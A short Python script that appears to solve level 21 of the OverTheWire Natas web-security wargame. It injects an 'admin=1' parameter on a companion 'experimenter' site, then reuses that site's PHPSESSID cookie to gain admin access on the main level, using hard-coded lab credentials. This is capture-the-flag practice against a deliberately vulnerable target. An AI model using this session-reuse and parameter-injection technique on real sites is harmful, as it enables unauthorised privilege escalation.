#!/usr/bin/python

import requests


auth = ("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ")

url = "http://natas21.natas.labs.overthewire.org?"
ex_url = "http://natas21-experimenter.natas.labs.overthewire.org?"

params = {
    "debug": "true",
    "submit": "true",
    "admin": "1"   
}

r = requests.get(ex_url, params=params, auth=auth)

print(r.text)
print('')

session_id = r.cookies.get('PHPSESSID')

# session_id = "admin"

headers = {
    'Cookie': "PHPSESSID=%s" % session_id
}
rs = requests.get(url, params={"debug": "true"}, auth=auth, headers=headers)
print(rs.text)